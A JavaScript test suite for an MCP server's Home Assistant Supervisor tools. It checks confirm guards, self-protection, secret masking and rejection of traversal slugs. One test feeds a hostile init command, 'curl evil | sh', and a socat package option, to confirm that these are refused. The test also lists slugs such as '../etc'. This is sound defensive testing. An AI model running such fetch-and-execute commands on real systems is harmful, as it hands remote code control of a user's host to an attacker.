// Supervisor tools: registration gates, exact Supervisor requests, confirm
// guards, self-protection, secret redaction and annotations.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { startFakeHA, startMcp, reply } from "./helpers/harness.mjs";

const SELF = "a1b2c3d4_ha_mcp";
const JOB = "0123456789abcdef0123456789abcdef";
const SSH = "a0d7b954_ssh";

const addons = [
  { name: "Mosquitto", slug: "core_mosquitto", version: "6.4.0", version_latest: "6.5.0", update_available: true, state: "started", repository: "core", description: "MQTT broker" },
  { name: "HA MCP", slug: SELF, version: "0.2.0", version_latest: "0.2.0", update_available: false, state: "started", repository: "abcd1234", description: "MCP" },
];

const fake = await startFakeHA({
  supervisor: {
    "GET /addons/self/info": () => ({ slug: SELF, name: "HA MCP" }),
    "GET /info": () => ({ hostname: "homeassistant", operating_system: "Home Assistant OS 16.0", machine: "generic-x86-64", arch: "amd64", state: "running", supported: true, channel: "stable" }),
    "GET /core/info": () => ({ version: "2026.9.1", version_latest: "2026.9.2", update_available: true, boot: true }),
    "GET /supervisor/info": () => ({ version: "2026.09.0", version_latest: "2026.09.0", update_available: false, healthy: true, supported: true }),
    "GET /os/info": () => ({ version: "16.0", version_latest: "16.0", update_available: false, board: "generic-x86-64" }),
    "GET /host/info": () => ({ hostname: "homeassistant", disk_free: 10 }),
    "GET /network/info": () => ({ interfaces: [] }),
    "GET /available_updates": () => ({ available_updates: [{ update_type: "core", version_latest: "2026.9.2" }, { update_type: "addon", name: "Mosquitto", version_latest: "6.5.0" }] }),
    "GET /resolution/info": () => ({ issues: [{ uuid: "aa11aa11", type: "free_space" }], suggestions: [], unhealthy: [], unsupported: [] }),
    "GET /addons": () => ({ addons }),
    "GET /store": () => ({
      addons: [
        { name: "Mosquitto", slug: "core_mosquitto", description: "MQTT broker", repository: "core", installed: true, version_latest: "6.5.0" },
        { name: "Samba share", slug: "core_samba", description: "Share folders", repository: "core", installed: false, version_latest: "12.0" },
      ],
      repositories: [{ slug: "core", name: "Official add-ons", url: "https://home-assistant.io/addons", maintainer: "HA" }],
    }),
    "GET /addons/core_mosquitto/info": () => ({ name: "Mosquitto", slug: "core_mosquitto", state: "started", options: { logins: [{ username: "u", password: "p1" }], customize: { active: false } }, schema: [] }),
    "GET /addons/core_mosquitto/logs": () => reply(200, "line1\nline2\n"),
    "GET /core/logs": () => reply(200, "core log\n"),
    "POST /addons/core_mosquitto/start": () => ({}),
    "POST /addons/core_mosquitto/stop": () => ({}),
    "POST /addons/core_mosquitto/restart": () => ({}),
    "POST /addons/core_mosquitto/uninstall": () => ({}),
    "POST /addons/core_mosquitto/options/validate": ({ body }) =>
      body?.customize?.active === "yes" ? { valid: false, message: "bad customize.active", pwned: false } : { valid: true, message: "", pwned: false },
    "POST /addons/core_mosquitto/options": () => ({}),
    // Advanced SSH-like add-on: command/package options and assorted secrets.
    [`GET /addons/${SSH}/info`]: () => ({
      name: "Advanced SSH & Web Terminal", slug: SSH, state: "started",
      options: {
        init_commands: ["echo hi"], packages: [], ssh: { username: "hassio", password: "", authorized_keys: ["ssh-ed25519 AAAAkey"], sftp: false },
        wifi_psk: "psk-value-1", alarm_pin: "4321", door_code: "9876", passphrase: "pp-value", private_key: "-----BEGIN", webhook_id: "wh-abc",
        credentials: "cred-x", api_key: "ak-1", ping_interval: 30, port_mapping: "22:22", zip_code: "a much longer postal code value",
      },
      schema: [],
    }),
    [`POST /addons/${SSH}/options/validate`]: ({ body }) =>
      body?.ssh?.password === "Sup3r-Secret"
        ? { valid: false, message: `Invalid option 'ssh' -> 'password': value 'Sup3r-Secret' too weak @ data['ssh']['password']. Got 'Sup3r-Secret'` }
        : { valid: true, message: "", pwned: false },
    [`POST /addons/${SSH}/options`]: ({ body }) =>
      body?.options?.wifi_psk === "leaky-psk-value"
        ? reply(400, { result: "error", message: `Add-on option 'wifi_psk' with value 'leaky-psk-value' rejected` })
        : {},
    "POST /store/addons/core_samba/install": () => ({ job_id: JOB }),
    "POST /store/addons/core_mosquitto/update": () => ({ job_id: JOB }),
    "POST /store/repositories": () => ({}),
    "DELETE /store/repositories/abcd1234": () => ({}),
    "GET /backups/info": () => ({ backups: [{ slug: "old00001", name: "Old", date: "2026-01-01T00:00:00Z", type: "full" }, { slug: "new00002", name: "New", date: "2026-09-01T00:00:00Z", type: "partial" }], days_until_stale: 30 }),
    "GET /backups/new00002/info": () => ({ slug: "new00002", name: "New", addons: [] }),
    "POST /backups/new/full": () => ({ job_id: JOB }),
    "POST /backups/new/partial": () => ({ job_id: JOB }),
    "DELETE /backups/new00002": () => ({}),
    "POST /backups/new00002/restore/full": () => ({ job_id: JOB }),
    "POST /backups/new00002/restore/partial": () => ({ job_id: JOB }),
    [`GET /jobs/${JOB}`]: () => ({ uuid: JOB, name: "backup_manager_full_backup", progress: 50, done: false, errors: [], child_jobs: [] }),
    "GET /jobs/info": () => ({ ignore_conditions: [], jobs: [{ uuid: JOB, done: true }] }),
    "POST /core/update": () => ({ job_id: JOB }),
    "POST /supervisor/update": () => ({}),
    "POST /os/update": () => ({}),
    "POST /core/check": () => ({}),
    "POST /core/restart": () => ({}),
    "POST /core/stop": () => ({}),
    "POST /core/start": () => ({}),
    "POST /core/rebuild": () => ({}),
    "POST /host/reboot": () => ({}),
    "POST /host/shutdown": () => ({}),
    "POST /resolution/suggestion/bb22bb22": () => ({}),
    "DELETE /resolution/suggestion/bb22bb22": () => ({}),
    "DELETE /resolution/issue/aa11aa11": () => ({}),
  },
});

let srv;
before(async () => {
  srv = await startMcp({ fake, env: { ENABLE_MANAGEMENT: "true" } });
});
after(async () => {
  await srv?.stop();
  await fake.stop();
});

/** Supervisor requests made by `fn`, excluding the self-slug lookup. */
async function sent(fn) {
  const start = fake.requests.length;
  const out = await fn();
  const reqs = fake.requests
    .slice(start)
    .filter((r) => r.kind === "supervisor" && r.path !== "/addons/self/info")
    .map((r) => ({ method: r.method, path: r.path, ...(Object.keys(r.query).length ? { query: r.query } : {}), ...(r.body !== undefined ? { body: r.body } : {}) }));
  return { out, reqs };
}

const TOOLS = {
  ha_system_overview: "ro",
  ha_get_system_info: "ro",
  ha_get_logs: "ro",
  ha_list_addons: "ro",
  ha_addon_info: "ro",
  ha_addon_control: "destructive",
  ha_addon_install: "destructive",
  ha_addon_uninstall: "destructive",
  ha_addon_set_options: "destructive",
  ha_store_repository: "destructive",
  ha_list_backups: "ro",
  ha_create_backup: "write",
  ha_remove_backup: "destructive",
  ha_restore_backup: "destructive",
  ha_get_job: "ro",
  ha_update: "destructive",
  ha_core_check_config: "ro",
  ha_core_control: "destructive",
  ha_host_power: "destructive",
  ha_resolution_action: "destructive",
};

test("not registered without ENABLE_MANAGEMENT", async () => {
  const s = await startMcp({ fake });
  try {
    const names = await s.toolNames();
    for (const t of Object.keys(TOOLS)) assert.ok(!names.includes(t), t);
  } finally {
    await s.stop();
  }
});

test("not registered when the Supervisor API is not configured", async () => {
  const s = await startMcp({ fake, withSupervisor: false, env: { ENABLE_MANAGEMENT: "true" } });
  try {
    const names = await s.toolNames();
    for (const t of Object.keys(TOOLS)) assert.ok(!names.includes(t), t);
  } finally {
    await s.stop();
  }
});

test("registered with management + Supervisor, with correct annotations", async () => {
  const tools = await srv.tools();
  const byName = Object.fromEntries(tools.map((t) => [t.name, t]));
  for (const [name, kind] of Object.entries(TOOLS)) {
    const t = byName[name];
    assert.ok(t, `missing ${name}`);
    const a = t.annotations ?? {};
    if (kind === "ro") assert.equal(a.readOnlyHint, true, name);
    if (kind === "write") assert.deepEqual([a.readOnlyHint, a.destructiveHint], [false, false], name);
    if (kind === "destructive") assert.deepEqual([a.readOnlyHint, a.destructiveHint], [false, true], name);
  }
});

test("system overview and info", async () => {
  const { out, reqs } = await sent(() => srv.call("ha_system_overview"));
  assert.ok(!out.isError, out.text);
  assert.equal(out.json.core.version, "2026.9.1");
  assert.equal(out.json.addons.installed, 2);
  assert.deepEqual(out.json.addons.updates_available, ["core_mosquitto"]);
  assert.equal(out.json.resolution.issues, 1);
  assert.equal(out.json.updates_available.length, 2);
  assert.ok(reqs.every((r) => r.method === "GET"));
  assert.deepEqual(reqs.map((r) => r.path).sort(), ["/addons", "/available_updates", "/core/info", "/info", "/os/info", "/resolution/info", "/supervisor/info"]);

  for (const [component, path] of [["host", "/host/info"], ["network", "/network/info"], ["resolution", "/resolution/info"], ["updates", "/available_updates"]]) {
    const r = await sent(() => srv.call("ha_get_system_info", { component }));
    assert.ok(!r.out.isError, r.out.text);
    assert.deepEqual(r.reqs, [{ method: "GET", path }]);
  }
});

test("logs: add-on and core, tail N lines as text", async () => {
  let r = await sent(() => srv.call("ha_get_logs", { source: "addon", slug: "core_mosquitto", lines: 50 }));
  assert.equal(r.out.text, "line1\nline2\n");
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/addons/core_mosquitto/logs", query: { lines: "50", no_colors: "" } }]);
  r = await sent(() => srv.call("ha_get_logs", { source: "core" }));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/core/logs", query: { lines: "100", no_colors: "" } }]);
  r = await sent(() => srv.call("ha_get_logs", { source: "addon" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
});

test("list add-ons (installed and store) and add-on info masks secrets", async () => {
  let r = await sent(() => srv.call("ha_list_addons"));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/addons" }]);
  assert.deepEqual(Object.keys(r.out.json.addons[0]).sort(), ["name", "repository", "slug", "state", "update_available", "version", "version_latest"]);

  r = await sent(() => srv.call("ha_list_addons", { source: "store", query: "samba" }));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/store" }]);
  assert.deepEqual(r.out.json.addons.map((a) => a.slug), ["core_samba"]);
  assert.equal(r.out.json.repositories[0].slug, "core");

  r = await sent(() => srv.call("ha_addon_info", { slug: "core_mosquitto" }));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/addons/core_mosquitto/info" }]);
  assert.equal(r.out.json.options.logins[0].password, "***");
  assert.equal(r.out.json.options.logins[0].username, "u");
  assert.match(r.out.json.logs_hint, /ha_get_logs/);

  r = await sent(() => srv.call("ha_addon_info", { slug: "../etc" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
});

test("add-on start/stop/restart, install, uninstall", async () => {
  for (const action of ["start", "stop", "restart"]) {
    const r = await sent(() => srv.call("ha_addon_control", { slug: "core_mosquitto", action }));
    assert.ok(!r.out.isError, r.out.text);
    assert.deepEqual(r.reqs, [{ method: "POST", path: `/addons/core_mosquitto/${action}` }]);
  }
  let r = await sent(() => srv.call("ha_addon_install", { slug: "core_samba" }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /confirm/);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_addon_install", { slug: "core_samba", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/store/addons/core_samba/install", body: { background: true } }]);
  assert.equal(r.out.json.job_id, JOB);

  r = await sent(() => srv.call("ha_addon_uninstall", { slug: "core_mosquitto" }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /confirm/);
  assert.deepEqual(r.reqs, []);

  r = await sent(() => srv.call("ha_addon_uninstall", { slug: "core_mosquitto", confirm: true, remove_config: true }));
  assert.ok(!r.out.isError, r.out.text);
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/addons/core_mosquitto/uninstall", body: { remove_config: true } }]);
});

test("set options: merged, validated first, invalid options are never saved", async () => {
  let r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: true } }, watchdog: true }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /confirm/);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: true } }, watchdog: true, confirm: true }));
  assert.ok(!r.out.isError, r.out.text);
  const merged = { logins: [{ username: "u", password: "p1" }], customize: { active: true } };
  assert.deepEqual(r.reqs, [
    { method: "GET", path: "/addons/core_mosquitto/info" },
    { method: "POST", path: "/addons/core_mosquitto/options/validate", body: merged },
    { method: "POST", path: "/addons/core_mosquitto/options", body: { options: merged, watchdog: true } },
  ]);

  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", options: { customize: { active: "yes" } }, merge: false, confirm: true }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /bad customize\.active/);
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/addons/core_mosquitto/options/validate", body: { customize: { active: "yes" } } }]);

  r = await sent(() => srv.call("ha_addon_set_options", { slug: "core_mosquitto", boot: "manual", restart: true, confirm: true }));
  assert.deepEqual(r.reqs, [
    { method: "POST", path: "/addons/core_mosquitto/options", body: { boot: "manual" } },
    { method: "POST", path: "/addons/core_mosquitto/restart" },
  ]);
});

test("self add-on protection: never stop/restart/update/uninstall/reconfigure itself", async () => {
  const attempts = [
    ["ha_addon_control", { slug: SELF, action: "stop" }],
    ["ha_addon_control", { slug: SELF, action: "restart" }],
    ["ha_addon_control", { slug: "self", action: "stop" }],
    ["ha_addon_uninstall", { slug: SELF, confirm: true }],
    ["ha_update", { target: "addon", slug: SELF }],
    ["ha_update", { target: "addon", slug: "self" }],
    ["ha_addon_set_options", { slug: SELF, options: { enable_actions: true } }],
  ];
  for (const [tool, args] of attempts) {
    const start = fake.requests.length;
    const r = await srv.call(tool, args);
    assert.ok(r.isError, `${tool} ${JSON.stringify(args)} should fail`);
    assert.match(r.text, /this add-on/);
    const writes = fake.requests.slice(start).filter((q) => q.kind === "supervisor" && q.method !== "GET");
    assert.deepEqual(writes, [], `${tool} sent a write`);
  }
});

test("store repositories: add and remove need confirm", async () => {
  let r = await sent(() => srv.call("ha_store_repository", { action: "add", repository: "https://github.com/example/addons" }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /confirm/);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_store_repository", { action: "add", repository: "https://github.com/example/addons", confirm: true }));
  assert.ok(!r.out.isError, r.out.text);
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/store/repositories", body: { repository: "https://github.com/example/addons" } }]);
  r = await sent(() => srv.call("ha_store_repository", { action: "remove", repository: "abcd1234" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_store_repository", { action: "remove", repository: "abcd1234", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/store/repositories/abcd1234" }]);
});

test("backups: list, info, create full/partial in background, password redacted from logs", async () => {
  let r = await sent(() => srv.call("ha_list_backups"));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/backups/info" }]);
  assert.deepEqual(r.out.json.backups.map((b) => b.slug), ["new00002", "old00001"]);
  r = await sent(() => srv.call("ha_list_backups", { slug: "new00002" }));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/backups/new00002/info" }]);

  const PW = "hunter2-very-secret";
  r = await sent(() => srv.call("ha_create_backup", { name: "Before update", password: PW }));
  assert.ok(!r.out.isError, r.out.text);
  assert.equal(r.out.json.job_id, JOB);
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new/full", body: { background: true, name: "Before update", password: PW } }]);

  r = await sent(() => srv.call("ha_create_backup", { name: "cfg", homeassistant: true, addons: ["core_mosquitto"], folders: ["share"], homeassistant_exclude_database: true }));
  assert.deepEqual(r.reqs, [{
    method: "POST",
    path: "/backups/new/partial",
    body: { background: true, name: "cfg", homeassistant_exclude_database: true, homeassistant: true, addons: ["core_mosquitto"], folders: ["share"] },
  }]);

  await sent(() => srv.call("ha_restore_backup", { slug: "new00002", password: PW, confirm: true, include_this_addon: true }));
  await new Promise((res) => setTimeout(res, 200));
  const logs = srv.logs.join("");
  assert.match(logs, /tool ha_create_backup .*"password":"\*\*\*"/);
  assert.ok(!logs.includes(PW), "password must never appear in logs");
});

test("backups: remove and restore require confirm", async () => {
  let r = await sent(() => srv.call("ha_remove_backup", { slug: "new00002" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_remove_backup", { slug: "new00002", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/backups/new00002" }]);

  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, include_this_addon: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/full", body: { background: true } }]);
  assert.equal(r.out.json.job_id, JOB);
  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, homeassistant: true, addons: ["core_mosquitto"] }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/partial", body: { background: true, homeassistant: true, addons: ["core_mosquitto"] } }]);
});

test("jobs", async () => {
  let r = await sent(() => srv.call("ha_get_job", { job_id: JOB }));
  assert.deepEqual(r.reqs, [{ method: "GET", path: `/jobs/${JOB}` }]);
  assert.equal(r.out.json.progress, 50);
  r = await sent(() => srv.call("ha_get_job"));
  assert.deepEqual(r.reqs, [{ method: "GET", path: "/jobs/info" }]);
  r = await sent(() => srv.call("ha_get_job", { job_id: "../info" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
});

test("updates: add-on (backup + background), core, supervisor, os", async () => {
  let r = await sent(() => srv.call("ha_update", { target: "addon", slug: "core_mosquitto" }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/store/addons/core_mosquitto/update", body: { backup: true, background: true } }]);
  assert.equal(r.out.json.job_id, JOB);
  r = await sent(() => srv.call("ha_update", { target: "core", backup: false, version: "2026.9.2" }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/update", body: { backup: false, background: true, version: "2026.9.2" } }]);
  r = await sent(() => srv.call("ha_update", { target: "supervisor" }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/supervisor/update", body: {} }]);
  r = await sent(() => srv.call("ha_update", { target: "os" }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/os/update", body: {} }]);
  r = await sent(() => srv.call("ha_update", { target: "addon" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
});

test("core: check config (valid and invalid), control with confirm", async () => {
  let r = await sent(() => srv.call("ha_core_check_config"));
  assert.deepEqual(r.out.json, { valid: true });
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/check" }]);

  const orig = fake.supervisor["POST /core/check"];
  fake.supervisor["POST /core/check"] = () => reply(400, { result: "error", message: "Invalid config for 'light'" });
  try {
    r = await sent(() => srv.call("ha_core_check_config"));
    assert.ok(!r.out.isError, r.out.text);
    assert.deepEqual(r.out.json, { valid: false, errors: "Invalid config for 'light'" });
  } finally {
    fake.supervisor["POST /core/check"] = orig;
  }

  for (const action of ["restart", "stop", "rebuild"]) {
    r = await sent(() => srv.call("ha_core_control", { action }));
    assert.ok(r.out.isError, action);
    assert.deepEqual(r.reqs, []);
  }
  r = await sent(() => srv.call("ha_core_control", { action: "restart", safe_mode: true, confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/restart", body: { safe_mode: true } }]);
  r = await sent(() => srv.call("ha_core_control", { action: "stop", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/stop", body: {} }]);
  r = await sent(() => srv.call("ha_core_control", { action: "rebuild", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/rebuild", body: {} }]);
  r = await sent(() => srv.call("ha_core_control", { action: "start" }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/core/start" }]);
});

test("host power requires confirm", async () => {
  for (const action of ["reboot", "shutdown"]) {
    let r = await sent(() => srv.call("ha_host_power", { action }));
    assert.ok(r.out.isError);
    assert.deepEqual(r.reqs, []);
    r = await sent(() => srv.call("ha_host_power", { action, confirm: true }));
    assert.ok(!r.out.isError, r.out.text);
    assert.deepEqual(r.reqs, [{ method: "POST", path: `/host/${action}`, body: {} }]);
  }
});

test("resolution: apply needs confirm, dismiss suggestion / issue", async () => {
  let r = await sent(() => srv.call("ha_resolution_action", { action: "apply_suggestion", uuid: "bb22bb22" }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  r = await sent(() => srv.call("ha_resolution_action", { action: "apply_suggestion", uuid: "bb22bb22", confirm: true }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/resolution/suggestion/bb22bb22" }]);
  r = await sent(() => srv.call("ha_resolution_action", { action: "dismiss_suggestion", uuid: "bb22bb22" }));
  assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/resolution/suggestion/bb22bb22" }]);
  r = await sent(() => srv.call("ha_resolution_action", { action: "dismiss_issue", uuid: "aa11aa11" }));
  assert.deepEqual(r.reqs, [{ method: "DELETE", path: "/resolution/issue/aa11aa11" }]);
});

test("slugs: strict pattern rejects dots and traversal, accepts real add-on slugs", async () => {
  for (const slug of [".", "..", "../info", "a..b", ".hidden", "a/b", "Core_Mosquitto", "-x", "a.b"]) {
    const r = await sent(() => srv.call("ha_addon_info", { slug }));
    assert.ok(r.out.isError, `slug ${slug} should be rejected`);
    assert.deepEqual(r.reqs, [], `slug ${slug} sent a request`);
  }
  for (const slug of ["core_mosquitto", SSH, "local_my-addon", "5c53de3b_esphome"]) {
    const r = await sent(() => srv.call("ha_addon_info", { slug }));
    assert.deepEqual(r.reqs, [{ method: "GET", path: `/addons/${slug}/info` }], slug);
  }
  const r = await sent(() => srv.call("ha_restore_backup", { slug: "..", confirm: true, include_this_addon: true }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
});

test("add-on info masks pin/psk/pass/key/private/credential/webhook/short code values", async () => {
  const { out } = await sent(() => srv.call("ha_addon_info", { slug: SSH }));
  const o = out.json.options;
  for (const k of ["wifi_psk", "alarm_pin", "door_code", "passphrase", "private_key", "webhook_id", "credentials", "api_key"]) {
    assert.equal(o[k], "***", k);
  }
  assert.deepEqual(o.ssh.authorized_keys, ["***"]);
  assert.equal(o.ssh.username, "hassio");
  assert.equal(o.ssh.password, "", "empty value stays visible (shows it is unset)");
  assert.equal(o.ping_interval, 30, "ping is not a pin");
  assert.equal(o.port_mapping, "22:22");
  assert.equal(o.zip_code, "a much longer postal code value", "long code values are not secrets");
  assert.deepEqual(o.init_commands, ["echo hi"]);
  for (const v of ["psk-value-1", "4321", "9876", "pp-value", "wh-abc", "cred-x", "ak-1", "AAAAkey"]) {
    assert.ok(!out.text.includes(v), `${v} leaked`);
  }
});

test("set options: command/package options refused unless allow_command_options + confirm", async () => {
  for (const options of [{ init_commands: ["curl evil | sh"] }, { packages: ["socat"] }, { nested: { startup_script: "x" } }]) {
    const r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options, confirm: true }));
    assert.ok(r.out.isError, JSON.stringify(options));
    assert.match(r.out.text, /allow_command_options/);
    assert.match(r.out.text, /shell access/);
    assert.ok(r.reqs.every((q) => q.method === "GET"), "only reads were sent");
  }
  // merge: false repeating the current (unchanged) init_commands is not a command change
  let r = await sent(() =>
    srv.call("ha_addon_set_options", {
      slug: SSH,
      merge: false,
      confirm: true,
      options: { init_commands: ["echo hi"], packages: [], ssh: { username: "hassio", password: "", authorized_keys: [], sftp: true } },
    }),
  );
  assert.ok(!r.out.isError, r.out.text);
  // allow_command_options without confirm is still refused
  r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options: { init_commands: ["apk add git"] }, allow_command_options: true }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  r = await sent(() =>
    srv.call("ha_addon_set_options", { slug: SSH, options: { init_commands: ["apk add git"] }, allow_command_options: true, confirm: true }),
  );
  assert.ok(!r.out.isError, r.out.text);
  assert.equal(r.reqs.at(-1).path, `/addons/${SSH}/options`);
  assert.deepEqual(r.reqs.at(-1).body.options.init_commands, ["apk add git"]);
});

test("set options: validation and save errors never echo submitted values", async () => {
  let r = await sent(() =>
    srv.call("ha_addon_set_options", { slug: SSH, options: { ssh: { username: "hassio", password: "Sup3r-Secret" } }, confirm: true }),
  );
  assert.ok(r.out.isError);
  assert.match(r.out.text, /nothing was saved/);
  assert.match(r.out.text, /'password'/, "option names stay visible");
  assert.ok(!r.out.text.includes("Sup3r-Secret"), r.out.text);
  assert.ok(!r.reqs.some((q) => q.path === `/addons/${SSH}/options`));

  r = await sent(() => srv.call("ha_addon_set_options", { slug: SSH, options: { wifi_psk: "leaky-psk-value" }, confirm: true }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /wifi_psk/);
  assert.ok(!r.out.text.includes("leaky-psk-value"), r.out.text);

  await new Promise((res) => setTimeout(res, 150));
  assert.ok(!srv.logs.join("").includes("Sup3r-Secret"), "validation value must not be logged");
});

test("restore: refuses to restore this add-on (full, or its slug in addons) without include_this_addon", async () => {
  let r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true }));
  assert.ok(r.out.isError);
  assert.match(r.out.text, /full restore/);
  assert.match(r.out.text, /options and access token/);
  assert.deepEqual(r.reqs, []);
  for (const addons of [[SELF], ["core_mosquitto", "self"]]) {
    r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, addons }));
    assert.ok(r.out.isError, JSON.stringify(addons));
    assert.match(r.out.text, /include_this_addon/);
    assert.deepEqual(r.reqs, []);
  }
  // include_this_addon without confirm: still refused
  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", include_this_addon: true, addons: [SELF] }));
  assert.ok(r.out.isError);
  assert.deepEqual(r.reqs, []);
  // partial restores without this add-on go through
  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, folders: ["share"] }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/partial", body: { background: true, folders: ["share"] } }]);
  r = await sent(() => srv.call("ha_restore_backup", { slug: "new00002", confirm: true, include_this_addon: true, addons: [SELF] }));
  assert.deepEqual(r.reqs, [{ method: "POST", path: "/backups/new00002/restore/partial", body: { background: true, addons: [SELF] } }]);

  // Self slug unknown: fail closed for partial restores naming add-ons.
  const orig = fake.supervisor["GET /addons/self/info"];
  fake.supervisor["GET /addons/self/info"] = () => reply(500, { result: "error", message: "boom" });
  const s = await startMcp({ fake, env: { ENABLE_MANAGEMENT: "true" } });
  try {
    const start = fake.requests.length;
    const out = await s.call("ha_restore_backup", { slug: "new00002", confirm: true, addons: ["core_mosquitto"] });
    assert.ok(out.isError);
    assert.match(out.text, /own slug/);
    assert.deepEqual(fake.requests.slice(start).filter((q) => q.method !== "GET"), []);
  } finally {
    fake.supervisor["GET /addons/self/info"] = orig;
    await s.stop();
  }
});
